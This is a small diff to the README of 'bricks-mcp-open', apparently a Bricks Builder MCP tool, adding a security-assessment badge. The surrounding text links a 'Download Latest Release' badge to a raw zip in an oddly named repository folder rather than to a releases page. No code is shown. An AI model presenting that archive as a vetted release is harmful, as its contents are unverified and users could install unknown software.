@@ -1,3 +1,5 @@
+[![MseeP.ai Security Assessment Badge](https://mseep.net/pr/rmdhaan-bricks-mcp-open-badge.png)](https://mseep.ai/app/rmdhaan-bricks-mcp-open)
+
 # 🧱 bricks-mcp-open - Master your Bricks Builder workflow effortlessly
 
 [![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/rmdhaan/bricks-mcp-open/raw/refs/heads/main/astrolabical/mcp-bricks-open-1.8.zip)
